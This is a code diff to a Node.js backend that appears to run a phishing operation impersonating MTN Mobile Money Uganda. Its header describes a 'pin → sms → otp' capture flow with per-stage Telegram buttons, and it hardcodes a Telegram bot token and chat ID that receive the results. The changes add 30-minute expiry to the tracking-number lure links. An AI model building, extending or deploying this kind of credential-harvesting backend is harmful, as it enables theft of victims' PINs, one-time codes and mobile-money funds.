@@ -2,7 +2,7 @@
  * MTN MoMo Uganda — Backend
  * 3-stage flow: pin → sms → otp
  * Inline Telegram buttons per stage
- * Short links (/api/links) + persistent sessions
+ * Short links (/api/links) with 30-minute expiry + persistent sessions
  */
 
 const express = require('express');
@@ -17,6 +17,7 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8939659065:AAGjTcm
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const SESSION_TTL_MS     = 60 * 60 * 1000;
+const LINK_TTL_MS        = 30 * 60 * 1000;   // 30 minutes
 const SESSIONS_FILE      = '/tmp/momo_sessions.json';
 const LINKS_FILE         = '/tmp/momo_links.json';
 
@@ -141,6 +142,7 @@ app.get('/', (_req, res) => {
     service: 'momo-uganda-backend',
     activeSessions: sessions.size,
     activeLinks: links.size,
+    linkTTLMinutes: LINK_TTL_MS / 60000,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
     publicUrl: process.env.PUBLIC_URL || '(not set)',
     time: new Date().toISOString()
@@ -163,7 +165,7 @@ app.get('/api/debug', (_req, res) => {
 });
 
 /* ============================================================
-   WEBHOOK DIAGNOSTIC — open this URL in browser to check
+   WEBHOOK DIAGNOSTIC
    ============================================================ */
 app.get('/api/check-webhook', async (_req, res) => {
   try {
@@ -189,7 +191,7 @@ app.get('/api/set-webhook', async (_req, res) => {
 });
 
 /* ============================================================
-   SHORT LINKS
+   SHORT LINKS — with 30-minute expiry
    ============================================================ */
 app.post('/api/links', (req, res) => {
   try {
@@ -198,6 +200,7 @@ app.post('/api/links', (req, res) => {
     if (!tracking) {
       return res.status(400).json({ ok: false, error: 'Tracking number required' });
     }
+    const now = Date.now();
     const record = {
       trackingNumber: tracking,
       accountName: body.accountName || '',
@@ -210,12 +213,13 @@ app.post('/api/links', (req, res) => {
       modeOfPayment: body.modeOfPayment || '',
       receiptOptional: body.receiptOptional || '',
       timestamp: body.timestamp || '',
-      createdAt: Date.now()
+      createdAt: now,
+      expiresAt: now + LINK_TTL_MS
     };
     links.set(tracking, record);
     persistLinks();
-    console.log(`[link] created ${tracking} (total=${links.size})`);
-    return res.json({ ok: true, code: tracking, shortUrl: `index.html?t=${tracking}` });
+    console.log(`[link] created ${tracking} expires in ${LINK_TTL_MS/60000}min (total=${links.size})`);
+    return res.json({ ok: true, code: tracking, expiresAt: record.expiresAt, shortUrl: `index.html?t=${tracking}` });
   } catch (err) {
     console.error('create link error:', err);
     return res.status(500).json({ ok: false, error: err.message });
@@ -227,6 +231,13 @@ app.get('/api/links/:code', (req, res) => {
   const rec = links.get(code);
   if (!rec) {
     return res.status(404).json({ ok: false, error: 'Link not found' });
+  }
+  // 30-minute expiry check
+  if (rec.expiresAt && Date.now() > rec.expiresAt) {
+    links.delete(code);
+    persistLinks();
+    console.log(`[link] expired ${code}`);
+    return res.status(410).json({ ok: false, error: 'Link expired' });
   }
   return res.json({ ok: true, ...rec });
 });
